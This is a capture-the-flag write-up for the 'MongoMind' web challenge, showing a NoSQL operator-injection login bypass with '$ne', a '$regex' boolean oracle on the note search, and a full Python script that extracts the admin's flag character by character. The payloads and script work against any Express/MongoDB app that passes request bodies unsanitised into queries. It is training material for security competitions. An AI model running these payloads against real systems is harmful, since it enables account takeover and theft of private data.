# MongoMind_MU (Security Impossible CTF 2026 - Monash University, web)

MongoMind provides a note-keeping web service built on Express.js and MongoDB. The application features user authentication and a note search interface. The administrator user holds a private note containing the competition flag. Our goal is to bypass authentication and exfiltrate the administrator's confidential note.

## NoSQL Operator Injection Authentication Bypass

The login endpoint at `/login` accepts JSON requests:

```json
{
  "user": "admin",
  "pass": "password123"
}
```

The backend processes authentication by passing the user-supplied JSON object directly into a Mongoose query without input sanitization or type validation:

```javascript
db.collection('users').findOne({ user: req.body.user, pass: req.body.pass })
```

In MongoDB, query fields can accept objects containing query selectors rather than primitive strings. When we supply the `$ne` (not equal) operator for the password field:

```json
{
  "user": "admin",
  "pass": { "$ne": "wrongpassword" }
}
```

MongoDB evaluates `{ pass: { $ne: "wrongpassword" } }`, which evaluates to `true` for any record whose password is not `"wrongpassword"`. The query succeeds and issues an authenticated session token for the `admin` account.

## Blind Boolean-Oracle Extraction via $regex

Once logged in as `admin`, we navigate to `/notes/search`. The search endpoint queries the user's private notes and returns a boolean match indicator:
- Match found: `{"match": true}`
- No match found: `{"match": false}`

The backend implements the search filter using MongoDB query syntax:

```javascript
db.collection('notes').findOne({ owner: req.user, note: req.body.note })
```

By supplying a `$regex` operator object inside `note`, we turn the search endpoint into a boolean extraction oracle. We can test prefixes of the flag character-by-character:

```json
{
  "note": { "$regex": "^sictf{a" }
}
```

If the flag starts with `sictf{a`, the query matches and returns `{"match": true}`. If it does not match, the query returns `{"match": false}`.

## Automating the Flag Extraction

We write an automated Python script to perform character-by-character extraction against the oracle:

```python
import string
import requests

TARGET = "target-web-42-mongomind"
PORT = 5110
URL = f"http://{TARGET}:{PORT}"

login_payload = {"user": "admin", "pass": {"$ne": "invalid"}}
s = requests.Session()
r = s.post(f"{URL}/login", json=login_payload)
assert r.status_code == 200, "Login failed"

charset = string.ascii_letters + string.digits + "_}"
flag = "sictf{"

while not flag.endswith("}"):
    found = False
    for char in charset:
        candidate = flag + char
        pattern = "^" + candidate.replace("{", r"\{").replace("}", r"\}")
        resp = s.post(f"{URL}/notes/search", json={"note": {"$regex": pattern}})
        if resp.json().get("match") is True:
            flag = candidate
            print(f"[+] Current flag: {flag}")
            found = True
            break
    if not found:
        print("[-] Character search stalled")
        break

print(f"[!] Extracted Flag: {flag}")
```

The script iterates through the character set, testing each position until reaching the closing bracket `}`.

Flag: `sictf{5feea4f2269c3bcadb66121c88184ef5}`
